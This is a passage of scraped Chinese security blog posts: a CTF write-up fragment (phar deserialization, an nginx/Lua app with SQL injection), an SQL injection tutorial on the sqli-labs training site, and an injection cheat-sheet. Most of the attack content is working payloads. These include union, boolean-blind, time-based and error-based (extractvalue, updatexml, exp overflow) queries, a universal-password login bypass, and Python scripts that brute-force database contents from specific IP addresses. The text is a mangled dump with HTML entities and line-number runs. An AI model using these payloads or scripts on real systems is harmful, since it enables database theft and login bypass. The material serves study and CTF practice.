__HALT_COMPILER(); ?&gt;'); $phar-&gt;setMetadata($exp); $phar-&gt;addFromString('text.txt','test'); $phar-&gt;stopBuffering();}; 上传文件getshellflag is here 5.总结反思经验不足，做题不够，欠练","link":"/2022/09/30/mt-ctf/"},{"title":"","text":"web1web2web3robots.txt发现敏感文件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185//nginx.confhttp { include mime.types; default_type application/octet-stream; #log_format main '$remote_addr - $remote_user [$time_local] &quot;$request&quot; ' # '$status $body_bytes_sent &quot;$http_referer&quot; ' # '&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;'; #access_log logs/access.log main; sendfile on; keepalive_timeout 65; server { listen 80; #access_log logs/host.access.log main; location / { default_type text/html; root html; index index.html index.htm; access_by_lua_block { local mysql = require &quot;resty.mysql&quot; local db, err = mysql:new() if not db then -- ngx.say(&quot;failed to instantiate mysql: &quot;, err) return end local ok, err, errcode, sqlstate = db:connect{ path = &quot;/run/mysqld/mysqld.sock&quot;, database = &quot;app&quot;, user = &quot;root&quot;, password = &quot;hello&quot; } if not ok then -- ngx.say(&quot;failed to connect: &quot;, err, &quot;: &quot;, errcode, &quot; &quot;, sqlstate) return end local headers = ngx.req.get_headers() local ip = ngx.quote_sql_str(&quot;233.233.233.233&quot;) if headers[&quot;X-Forwarded-For&quot;] then ip = ngx.quote_sql_str(headers[&quot;X-Forwarded-For&quot;]) end uri = ngx.quote_sql_str(ngx.var.request_uri) local sql = &quot;INSERT INTO records(url, ip) VALUES (&quot; .. uri .. &quot;, &quot; .. ip .. &quot;)&quot; -- ngx.say(sql) res, err, errcode, sqlstate = db:query(sql) if not res then -- ngx.say(&quot;bad result: &quot;, err, &quot;: &quot;, errcode, &quot;: &quot;, sqlstate, &quot;.&quot;) return end -- local cjson = require &quot;cjson&quot; -- ngx.say(&quot;result: &quot;, ip, cjson.encode(uri)) } } location /cat-admin-panel/history { default_type text/html; content_by_lua_block { local mysql = require &quot;resty.mysql&quot; local db, err = mysql:new() if not db then -- ngx.say(&quot;failed to instantiate mysql: &quot;, err) return end local ok, err, errcode, sqlstate = db:connect{ path = &quot;/run/mysqld/mysqld.sock&quot;, database = &quot;app&quot;, user = &quot;root&quot;, password = &quot;hello&quot; } if not ok then -- ngx.say(&quot;failed to connect: &quot;, err, &quot;: &quot;, errcode, &quot; &quot;, sqlstate) return end local headers = ngx.req.get_headers() local ip = ngx.quote_sql_str(&quot;233.233.233.233&quot;) if headers[&quot;X-Forwarded-For&quot;] then ip = ngx.quote_sql_str(headers[&quot;X-Forwarded-For&quot;]) end local cjson = require &quot;cjson&quot; local user_mode = ngx.var.arg_user_mode local sql if user_mode == &quot;yes&quot; then res, err, errcode, sqlstate = db:query(&quot;SELECT * FROM users WHERE ip = &quot; .. ip) if not res[1] then return end local name = res[1][&quot;name&quot;] ngx.say(&quot;Your history:&lt;br&gt;&quot;) sql = &quot;SELECT records.url, users.name, users.ip FROM records, users WHERE users.name = '&quot;..name..&quot;' AND records.ip = users.ip&quot; else ngx.say(&quot;Site request history: &lt;br&gt;&quot;) sql = &quot;SELECT * FROM records&quot; end res, err, errcode, sqlstate = db:query(sql) if not res then -- ngx.say(&quot;bad result: &quot;, err, &quot;: &quot;, errcode, &quot;: &quot;, sqlstate, &quot;.&quot;) return end ngx.say(cjson.encode(res)) -- ngx.say(ngx.var.remote_addr) db:close() } } location /cat-admin-panel/register { default_type text/html; content_by_lua_block { local mysql = require &quot;resty.mysql&quot; local db, err = mysql:new() if not db then -- ngx.say(&quot;failed to instantiate mysql: &quot;, err) return end local ok, err, errcode, sqlstate = db:connect{ path = &quot;/run/mysqld/mysqld.sock&quot;, database = &quot;app&quot;, user = &quot;root&quot;, password = &quot;hello&quot; } if not ok then -- ngx.say(&quot;failed to connect: &quot;, err, &quot;: &quot;, errcode, &quot; &quot;, sqlstate) return end local headers = ngx.req.get_headers() local ip = ngx.quote_sql_str(&quot;233.233.233.233&quot;) if headers[&quot;X-Forwarded-For&quot;] then ip = ngx.quote_sql_str(headers[&quot;X-Forwarded-For&quot;]) end local cjson = require &quot;cjson&quot; local user = ngx.var.arg_user ngx.say(&quot;Your IP: &quot;, ip) ngx.say(&quot;Your name: &quot;, user) if user then res, err, errcode, sqlstate = db:query(&quot;INSERT INTO users(name, ip) VALUES (&quot;.. ngx.quote_sql_str(user) ..&quot;,&quot;.. ip ..&quot;)&quot;) if not res then -- ngx.say(&quot;bad result: &quot;, err, &quot;: &quot;, errcode, &quot;: &quot;, sqlstate, &quot;.&quot;) return end else ngx.say(&quot;Who?&quot;) return end db:close() } } }}","link":"/2022/11/26/hitctf/"},{"title":"SQL注入学习寄录","text":"0x01 SQLSQL 是一种标准SQL 是一门 ANSI（American National Standards Institute 美国国家标准化组织）标准的计算机语言，但是仍然存在着多种不同版本的 SQL 语言。 库&amp;表一个数据库通常包括一个或多个表。每个表都有一个名字标识，表包含带有数据的记录。 SQL 基础语法最简单的查询SELECT * FROM 表名 这个语句会把当前表下所有的数据全都列出来，在数据量比较小的时候会很好用，但当数据量特别大的时候就容易被一堆数据淹没，不知所措。 这时候可以添加限制，指定我要哪一列的数据 SELECT 列名 FROM 表名 数据还是很多，可以添加WHERE来进行进一步限制 SELECT 列名 FROM 表名 WHERE 条件 如果需要将数据排序的话，可以用ORDER BY SELECT 列名 FROM 表名 WHERE 条件 ORDER BY 列名 有时候，咱只想返回前几条数据，就可以加入LIMIT SELECT 列名 FROM 表名 WHERE 条件 ORDER BY 列名 LIMIT 数字 SQL操作符WHERE 列名 LIKE 通配符 按照通配符匹配 通配符 描述 % 替代0个或多个字符 _ 替代1个字符 [charlist] 字符列中的任何单一字符 [^charlist] 或 [!charlist] 不在字符列中的任何单一字符 WHERE 列名 IN (‘值1’,’值2’) WHERE 列名 BETWEEN 值1 AND 值2; 联合查询SELECT 列名1,列名2… FROM table1 UNION SELECT 列名1,列名2… FROM table2; 注意:联合查询要求前后字段数相同，否则将会报错. 特殊的数据库information_schema摘自这里 在数据库里，有这样一个数据库information_schema，数据库是MySQL自带的，它提供了访问数据库元数据的方式。什么是元数据呢？元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。有些时候用于表述该信息的其他术语包括“数据词典”和“系统目录”。 表名 功能 SCHEMATA 提供了当前mysql实例中所有数据库的信息。是show databases的结果取之此表。 TABLES 提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。是show tables from schemaname的结果取之此表。 COLUMNS 供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表。 STATISTICS 提供了关于表索引的信息。是show index from schemaname.tablename的结果取之此表。 USER_PRIVILEGES 给出了关于全程权限的信息。该信息源自mysql.user授权表。是非标准表。 SCHEMA_PRIVILEGES 给出了关于方案（数据库）权限的信息。该信息来自mysql.db授权表。是非标准表。 TABLE_PRIVILEGES（表权限） 给出了关于表权限的信息。该信息源自mysql.tables_priv授权表。是非标准表。 COLUMN_PRIVILEGES（列权限） 给出了关于列权限的信息。该信息源自mysql.columns_priv授权表。是非标准表。 CHARACTER_SETS（字符集） 提供了mysql实例可用字符集的信息。是SHOW CHARACTER SET结果集取之此表。 … … 在注入的过程中，我们常用的是information_schema.tables下面的table_name以及table_schema表名及其所在的数据库名字。使用information_schema.columns下的column_name获取列名 select 的其他用法12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667mysql&gt; select 1;+---+| 1 |+---+| 1 |+---+1 row in set (0.00 sec)mysql&gt; select 1,2,3;+---+---+---+| 1 | 2 | 3 |+---+---+---+| 1 | 2 | 3 |+---+---+---+1 row in set (0.00 sec)mysql&gt; select (1&gt;2);+-------+| (1&gt;2) |+-------+| 0 |+-------+1 row in set (0.00 sec)mysql&gt; select (1&lt;2);+-------+| (1&lt;2) |+-------+| 1 |+-------+1 row in set (0.00 sec)mysql&gt; select &quot;aaaa&quot;;+------+| aaaa |+------+| aaaa |+------+1 row in set (0.00 sec)mysql&gt; select (1&lt;2) from users;+-------+| (1&lt;2) |+-------+| 1 || 1 || 1 || 1 || 1 || 1 || 1 || 1 || 1 || 1 || 1 || 1 || 1 |+-------+13 rows in set (0.00 sec)mysql&gt; select (version());+-------------------------+| (version()) |+-------------------------+| 5.5.44-0ubuntu0.14.04.1 |+-------------------------+1 row in set (0.00 sec) SQL 注入常用函数字符拼接1. concat()函数 功能：将多个字符串连接成一个字符串。 语法：concat(str1, str2,…) 说明：返回结果为连接参数产生的字符串，如果有任何一个参数为null，则返回值为null。 123456789101112131415161718mysql&gt; select concat('a','b','c') -&gt; ;+---------------------+| concat('a','b','c') |+---------------------+| abc |+---------------------+1 row in set (0.00 sec)mysql&gt; select concat('a','b','c','null') -&gt; ;+----------------------------+| concat('a','b','c','null') |+----------------------------+| abcnull |+----------------------------+1 row in set (0.00 sec) 2. concat_ws()函数 功能 和concat()一样，但是可以指定分隔符 语法：concat_ws(separator, str1, str2, …) 第一个参数指定分隔符。需要注意的是分隔符不能为null，如果为null，则返回结果为null。 12345678mysql&gt; select concat_ws('#','a','b','c','null') -&gt; ;+-----------------------------------+| concat_ws('#','a','b','c','null') |+-----------------------------------+| a#b#c#null |+-----------------------------------+1 row in set (0.00 sec) 3.group_concat()函数 功能：将group by产生的同一个分组中的值连接起来，返回一个字符串结果。 语法：group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc ] [separator] ) 12345678mysql&gt; select 1,(select group_concat(username) from users); +---+---------------------------------------------------------------------------------------------+| 1 | (select group_concat(username) from users) |+---+---------------------------------------------------------------------------------------------+| 1 | Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4 |+---+---------------------------------------------------------------------------------------------+1 row in set (0.00 sec) 盲注常用1.ascii()函数都会用，不说了 2.substr()函数 substr(str,pos,len);//str:字符串，pos：起始位置，len：截断长度 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647mysql&gt; select substr(&quot;abcdefg&quot;,1,1);+-----------------------+| substr(&quot;abcdefg&quot;,1,1) |+-----------------------+| a |+-----------------------+1 row in set (0.00 sec)mysql&gt; select substr(&quot;abcdefg&quot;,1,3);+-----------------------+| substr(&quot;abcdefg&quot;,1,3) |+-----------------------+| abc |+-----------------------+1 row in set (0.00 sec)mysql&gt; select substr(&quot;abcdefg&quot;,2,3);+-----------------------+| substr(&quot;abcdefg&quot;,2,3) |+-----------------------+| bcd |+-----------------------+1 row in set (0.00 sec)mysql&gt; select substr(&quot;abcdefg&quot;,-2,3);+------------------------+| substr(&quot;abcdefg&quot;,-2,3) |+------------------------+| fg |+------------------------+1 row in set (0.01 sec)mysql&gt; select substr(&quot;abcdefg&quot;,-2,1);+------------------------+| substr(&quot;abcdefg&quot;,-2,1) |+------------------------+| f |+------------------------+1 row in set (0.00 sec)mysql&gt; select substr(&quot;abcdefg&quot;,-3,2);+------------------------+| substr(&quot;abcdefg&quot;,-3,2) |+------------------------+| ef |+------------------------+1 row in set (0.00 sec) sleep()都会，不说了 报错注入常用updatexml()extractvalue()group by报错注入0x02 SQL注入靶场–Sqli-labsLess-1 | 显错注入判断注入点为字符型还是数字型: ?id=1 id=2 id=1+1 这里可以发现，没有对我们输入的1+1进行运算,可以确定是字符型注入。查看源代码 1$sql=&quot;SELECT * FROM users WHERE id='$id' LIMIT 0,1&quot;; 这里有个令人异或的地方:?id=1+1为啥返回了?id=1的结果，这里进mysql控制台里面康康。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061mysql&gt; select * from users where id='1+1';+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb |+----+----------+----------+1 row in set, 1 warning (0.00 sec)mysql&gt; select * from users where id=1;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb |+----+----------+----------+1 row in set (0.00 sec)mysql&gt; select * from users where id=&quot;1&quot;;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb |+----+----------+----------+1 row in set (0.00 sec)mysql&gt; select * from users where id=&quot;1a&quot;;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb |+----+----------+----------+1 row in set, 1 warning (0.00 sec)mysql&gt; select * from users where id=&quot;a1&quot;;Empty set (0.00 sec)mysql&gt; select * from users where id=&quot;0x1&quot;;Empty set (0.00 sec)mysql&gt; select * from users where id=0x1;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb |+----+----------+----------+1 row in set (0.00 sec)mysql&gt; select * from users where id=+0b01;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb |+----+----------+----------+1 row in set (0.00 sec)mysql&gt; select * from users where id=+ 0b01;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb |+----+----------+----------+1 row in set (0.00 sec) 这宛如PHP一样强大的鲁棒性，我已经有不好的预感了。 众所周知，方便程序员写代码 = 方便黑客进来搞事情。 更深入的测试联合注入: ?id=1’ union select 1,2,3 –+ 实际执行的是，这里--+是将后面的内容注释掉了 SELECT * FROM users WHERE id=’1’ union select 1,2,3 –+ LIMIT 0,1 好像啥都没变，不过在后端的代码里可以看见相关的逻辑 12345678if($row) { echo &quot;&lt;font size='5' color= '#99FF00'&gt;&quot;; echo 'Your Login name:'. $row['username']; echo &quot;&lt;br&gt;&quot;; echo 'Your Password:' .$row['password']; echo &quot;&lt;/font&gt;&quot;; } MySQL返回的是 1234567+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb || 1 | 2 | 3 |+----+----------+----------+2 rows in set (0.00 sec) 但因为后端代码的设计，只能显示第一条，这时候我们可以让前面id指向一个不存在的数据,这样第一条数据就只会返回空 1234567mysql&gt; SELECT * FROM users WHERE id='-1' union select 1,2,3; +----+----------+----------+| id | username | password |+----+----------+----------+| 1 | 2 | 3 |+----+----------+----------+1 row in set (0.00 sec) 开始爆金币数据了 ?id=-1’ union select 1,(select username from users limit 4,1),3 –+ 因为select username from users会返回多条数据，这时候使用limit来限制返回哪一行 这样子爆破数据不够爽，还得手动一个一个搓，太麻烦了,直接上group_concat() ?id=-1’ union select 1,(select group_concat(username) from users),3 –+ 不过这是咱在翻看了源代码，并且知道这些数据的情况下做出来的，在真正注入的环境下，得需要获取这些数据，这时候就需要information_schema这个数据库了 ?id=-1’ union select 1,(select group_concat(schema_name) from schemata),3 –+ 发生什么事了？好像有点不太对劲呢。因为这题所在的数据库是security，而schemata是在information_schema这个数据库下面的。我们需要换成information_schema.schemata ?id=-1’ union select 1,(select group_concat(schema_name) from information_schema.schemata),3 –+ 数据库爆出来了，爆表名 ?id=-1’ union select 1,(select group_concat(table_name) from information_schema.columns where table_schema=”security”),3 –+ 表名出来了，爆字段 ?id=-1’ union select 1,(select group_concat(column_name) from information_schema.columns where table_name=”users”),3 –+ 需要的数据都有了，咱可以直接把库给脱下来了 Less-2 - Less-4这几题都一样，无非是注入点周围包裹的东西不一样，不多赘述，过。 Less-5 | 布尔盲注 ?id=1 眉清目秀，啥都木有。 ?id=1”‘一通测试下来，发现有了报错信息 如何利用报错信息注入呢？ ?id=1’ and 1 = 1 –+i ?id=2’ and 2 = 1 –+ 那有意思的就来了，嘻嘻 12345678mysql&gt; select ((substr(group_concat((select group_concat(schema_name) from information_schema.schemata)),1,1))=0);+-----------------------------------------------------------------------------------------------------+| ((substr(group_concat((select group_concat(schema_name) from information_schema.schemata)),1,1))=0) |+-----------------------------------------------------------------------------------------------------+| 1 |+-----------------------------------------------------------------------------------------------------+1 row in set (0.00 sec) 爆数据库 1234567891011121314import requestsurl = &quot;http://39.104.82.167/Less-5/?id=&quot;res = &quot;&quot;for i in range(0,256): for j in range(0,256): for k in range(0,256): payload = f&quot;1' and ascii(substr((select group_concat(schema_name) from information_schema.schemata),{j},1)) = {k} --+&quot; r = requests.get(url+payload) if &quot;You are in...........&quot; in r.text: res += chr(k) print(res) break 更改payload来爆表 1payload = f&quot;1' and ascii(substr((select group_concat(table_name) from information_schema.columns where table_schema=\\&quot;security\\&quot;),{j},1)) = {k} --+&quot; 更改payload 来爆字段 1payload = f&quot;1' and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;),{j},1)) = {k} --+&quot; Tips 无AND的情况下，可以用^ Less 6-8 都差不多，就是需要各种奇妙的闭合略 Less 9这里需要时间盲注，和布尔盲注差不多只是需要添加一个if(a,sleep(10),1)判断 ?id=1’ and if(1=1,sleep(5),1)–+ 判断参数构造。 ?id=1’and if(length((select database()))&gt;9,sleep(5),1)–+ 判断数据库名长度 ?id=1’and if(ascii(substr((select database()),1,1))=115,sleep(5),1)–+ 逐一判断数据库字符 ?id=1’and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13,sleep(5),1)–+ 判断所有表名长度 ?id=1’and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99,sleep(5),1)–+ 逐一判断表名 ?id=1’and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=’users’))&gt;20,sleep(5),1)–+ 判断所有字段名的长度 ?id=1’and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=’users’),1,1))&gt;99,sleep(5),1)–+ 逐一判断字段名。 ?id=1’ and if(length((select group_concat(username,password) from users))&gt;109,sleep(5),1)–+ 判断字段内容长度 ?id=1’ and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)–+ 逐一检测内容。 Less 10 一模一样，略Less 11 | 万能密码这次开始，不是get传参了，换成POST传参还给了个登录框，先随便穿个数据康康 这时候拿出我们的究极无敌炫酷万能密码1' or 1=1# 好了，这就进去了 为什么呢？咱把源码翻开 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);error_reporting(0);// take the variablesif(isset($_POST['uname']) &amp;&amp; isset($_POST['passwd'])){ $uname=$_POST['uname']; $passwd=$_POST['passwd']; //logging the connection parameters to a file for analysis. $fp=fopen('result.txt','a'); fwrite($fp,'User Name:'.$uname); fwrite($fp,'Password:'.$passwd.&quot;\\n&quot;); fclose($fp); // connectivity @$sql=&quot;SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1&quot;; $result=mysql_query($sql); //注意这里 $row = mysql_fetch_array($result); if($row) { //echo '&lt;font color= &quot;#0000ff&quot;&gt;'; echo &quot;&lt;br&gt;&quot;; echo '&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;'; //echo &quot; You Have successfully logged in\\n\\n &quot; ; echo '&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;'; echo &quot;&lt;br&gt;&quot;; echo 'Your Login name:'. $row['username']; echo &quot;&lt;br&gt;&quot;; echo 'Your Password:' .$row['password']; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo '&lt;img src=&quot;../images/flag.jpg&quot; /&gt;'; echo &quot;&lt;/font&gt;&quot;; } else { echo '&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;'; //echo &quot;Try again looser&quot;; print_r(mysql_error()); echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo '&lt;img src=&quot;../images/slap.jpg&quot; /&gt;'; echo &quot;&lt;/font&gt;&quot;; }}?&gt; 关键点在这里$result=mysql_query($sql); 这里的结果是用sql语句的查询结果来，所以只需要让语句返回一个真就行了，or 1 = 1使得整个语句恒真，这就让我们成功登陆进去了 之后我们就可以注入获取信息了。 Less 12 -16 都差不多略 Less 17 | 报错注入这题开始不同了，使用的是update而不是select 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394function check_input($value) { if(!empty($value)) { // truncation (see comments) $value = substr($value,0,15); } // Stripslashes if magic quotes enabled if (get_magic_quotes_gpc()) { $value = stripslashes($value); } // Quote if not a number if (!ctype_digit($value)) { $value = &quot;'&quot; . mysql_real_escape_string($value) . &quot;'&quot;; } else { $value = intval($value); } return $value; }// take the variablesif(isset($_POST['uname']) &amp;&amp; isset($_POST['passwd'])){//making sure uname is not injectable$uname=check_input($_POST['uname']); $passwd=$_POST['passwd'];//logging the connection parameters to a file for analysis.$fp=fopen('result.txt','a');fwrite($fp,'User Name:'.$uname.&quot;\\n&quot;);fwrite($fp,'New Password:'.$passwd.&quot;\\n&quot;);fclose($fp);// connectivity @$sql=&quot;SELECT username, password FROM users WHERE username= $uname LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);//echo $row; if($row) { //echo '&lt;font color= &quot;#0000ff&quot;&gt;'; $row1 = $row['username']; //echo 'Your Login name:'. $row1; $update=&quot;UPDATE users SET password = '$passwd' WHERE username='$row1'&quot;; mysql_query($update); echo &quot;&lt;br&gt;&quot;; if (mysql_error()) { echo '&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;'; print_r(mysql_error()); echo &quot;&lt;/br&gt;&lt;/br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; } else { echo '&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;'; //echo &quot; You password has been successfully updated &quot; ; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; } echo '&lt;img src=&quot;../images/flag1.jpg&quot; /&gt;'; //echo 'Your Password:' .$row['password']; echo &quot;&lt;/font&gt;&quot;; } else { echo '&lt;font size=&quot;4.5&quot; color=&quot;#FFFF00&quot;&gt;'; //echo &quot;Bug off you Silly Dumb hacker&quot;; echo &quot;&lt;/br&gt;&quot;; echo '&lt;img src=&quot;../images/slap1.jpg&quot; /&gt;'; echo &quot;&lt;/font&gt;&quot;; }} 报错注入开淦 能进行报错的函数extractvalue() 演示: 12345mysql&gt; select extractvalue(1,concat(0x5c,&quot;114514&quot;,0x5c));ERROR 1105 (HY000): XPATH syntax error: '\\114514\\'``` * payload: 1’ and (extractvalue(1,concat(0x5c,version(),0x5c)))# 爆版本 1’ and (extractvalue(1,concat(0x5c,database(),0x5c)))# 爆数据库 1’ and (extractvalue(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5c)))# 爆表名 1’ and (extractvalue(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=’users’),0x5c)))# 爆字段名 1’ and (extractvalue(1,concat(0x5c,(select password from (select password from users where username=’admin1’) b) ,0x5c)))# 爆字段内容该格式针对mysql数据库。 1’ and (extractvalue(1,concat(0x5c,(select group_concat(username,password) from users),0x5c)))# 爆字段内容。 1234567#### updatexml()* `updatexml()`是一个使用不同的xml标记匹配和替换xml块的函数。* 语法： updatexml（XML_document，XPath_string，new_value） 第一个参数：是string格式，为XML文档对象的名称，文中为Doc 第二个参数：代表路径，Xpath格式的字符串例如//title【@lang】 第三个参数：string格式，替换查找到的符合条件的数据* updatexml使用时，当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax） mysql&gt; select (updatexml(1,concat(0x7e,(version()),0x7e),1));ERROR 1105 (HY000): XPATH syntax error: ‘5.5.44-0ubuntu0.14.04.1‘ 公式: updatexml(数字,带有'~'的任何东西,数字) updatexml(数字,(concat(0x7e,(长度不过63的任意字符),0x7e)),数字) ## less 18 - Less19 地点不一样，懒得弄了. ## Less20 - Less23 base64编码了一下，还是一样 ## Less24 | 二次注入","link":"/2022/10/06/sql/"},{"title":"How sfc9982 helped me solve hexo problem","text":"How sfc9982 helped me solve hexo problem I used removeif/hexo-theme-amazing He STFW and RTFM then he solved it. I deeply apperciate his generous assistance.His blog is at googles.plus","link":"/2022/09/29/i-love-hexo/"},{"title":"SQL注入备忘录","text":"最近在用sql-lib学sql注入，零零散散的笔记整了一大堆，现在整合一下，做个备忘录，方便比赛的时候方便查询。 典中典版本:爆库版本: ?id=-1' union select 1,database(),3--+爆库: ?id=-1' union select 1,group_concat(schema_name),3 from information_schema.schemata --+爆表: ?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='数据库'#爆字段: ?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='数据表'#这几个出来了，剩下的就不用我说了吧qwq 常用函数: 名称 作用 system_user() 系统用户名 user() 用户名 session_user() 连接数据库的用户名 database() 数据库名 version() MYSQL数据库版本 load_file() MYSQL读取本地文件的函数 @@datadir 读取数据库路径 @@basedir MYSQL 安装路径 @@version_compile_os 操作系统 报错注入:extractvalue函数都会，不解释了。公式:extractvalue(数字,concat(0x7e,(查询语句),0x7e)) updatexml函数都会，不解释了。公式:updatexml(数字,concat(0x7e,(查询语句),0x7e),数字) 溢出报错exp函数溢出 | mysql&gt;5.5.53原理:当传递一个大于 709 的值时，函数 exp() 就会引起一个溢出错误,用 ~ 运算符按位取反的方式得到一个最大值，该运算符也可以处理一个字符串，经过其处理的字符串会变成大一个很大整数足以超过 MySQL 的 Double 数组范围，从而报错输出。 1234567891011mysql&gt; select ~(select version());+----------------------+| ~(select version()) |+----------------------+| 18446744073709551610 |+----------------------+1 row in set, 1 warning (0.00 sec)mysql&gt; select exp(~(select * from(select version())x));ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select '5.5.44-0ubuntu0.14.04.1' from dual)))'mysql&gt; 公式:select exp(~(select * from(查询语句)x));支持load_file,最多13行 BIGINT溢出差不多同样的原理，可以报错公式:select 1+~(select*from(查询语句)x);同理，其他的函数也可以这么干: 123select !atan((select*from(查询语句)a))-~0;select !ceil((select*from(查询语句)a))-~0;select !floor((select*from(查询语句)a))-~0; 其他能利用的函数… 12345678910111213HEXINFLOORCEILRANDCEILINGTRUNCATETANSQRTROUNDSIGNEXP... group by 注入 | 表中的数据至少要为三条才可以注入成功原理:group_by注入 公式:select count(*) from information_schema.tables group by concat((查询语句),floor(rand()*2));效率比较低qwq而且还有猜错的可能 无select注入 | MySQL 8浅谈利用mysql8新特性进行SQL注入脚本搬到这里了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203'''@author qwzf@desc 本脚本是用于mysql 8新特性的sql注入@date 2021/02/18'''import requestsimport stringurl = 'http://121.41.231.75:8002/Less-8/?id='chars=string.ascii_letters+string.digits+&quot;@{}_-?&quot;def current_db(url): print(&quot;利用mysql8新特性或普通布尔盲注:\\n1.新特性(联合查询) 2.普通布尔盲注&quot;) print(&quot;请输入序号:&quot;,end='') num = int(input()) if num == 1: payload = &quot;-1' union values row(1,database(),3)--+&quot; #联合查询爆当前数据库(可修改) urls = url + payload r = requests.get(url=urls) print(r.text) else: name='' payload = &quot;1' and ascii(substr((database()),{0},1))={1}--+&quot; #布尔盲注爆当前数据库(可修改) for i in range(1,40): char='' for j in chars: payloads = payload.format(i,ord(j)) urls = url + payloads r = requests.get(url=urls) if &quot;You are in&quot; in r.text: name += j print(name) char = j break if char == '': breakdef str2hex(name): res = '' for i in name: res += hex(ord(i)) res = '0x' + res.replace('0x','') return resdef dbs(url): #无列名盲注爆所有数据库(可修改) while True: print(&quot;请输入要爆第几个数据库，如：1,2等:&quot;,end='') x = int(input())-1 num = str(x) if x &lt; 0: break payload = &quot;1' and ('def',{},'',4,5,6)&gt;(table information_schema.schemata limit &quot;+num+&quot;,1)--+&quot; name = '' for i in range(1,20): hexchar = '' for char in range(32, 126): hexchar = str2hex(name + chr(char)) payloads = payload.format(hexchar) #print(payloads) urls = url + payloads r = requests.get(url=urls) if 'You are in' in r.text: name += chr(char-1) print(name) breakdef tables_n(url,database): #无列名盲注爆数据表开始行数(可修改) payload = &quot;1' and ('def','&quot;+database+&quot;','','',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&lt;(table information_schema.tables limit {},1)--+&quot; for i in range(0,10000): payloads = payload.format(i) urls = url + payloads r = requests.get(url=urls) if 'You are in' in r.text: char = chr(ord(database[-1])+1) database = database[0:-1]+char payld = &quot;1' and ('def','&quot;+database+&quot;','','',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&lt;(table information_schema.tables limit &quot;+str(i)+&quot;,1)--+&quot; urls = url + payld res = requests.get(url=urls) #print(i) if 'You are in' not in res.text: print('从第',i,'行开始爆数据表') #判断开始行数 n = i break return ndef tables(url,database,n): #无列名盲注爆数据表(可修改) while True: print(&quot;请输入要爆第几个数据表，如：1,2等:&quot;,end='') x = int(input())-1 num = str(x + n) if x &lt; 0: break payload = &quot;1' and ('def','&quot;+database+&quot;',{},'',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&gt;(table information_schema.tables limit &quot;+num+&quot;,1)--+&quot; name = '' for i in range(1,20): hexchar = '' for char in range(32, 126): hexchar = str2hex(name + chr(char)) payloads = payload.format(hexchar) #print(payloads) urls = url + payloads r = requests.get(url=urls) if 'You are in' in r.text: name += chr(char-1) print(name) breakdef columns_n(url,database,table): #无列名盲注爆字段开始行数(可修改) payload = &quot;1' and ('def','&quot;+database+&quot;','&quot;+table+&quot;','',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&lt;(table information_schema.columns 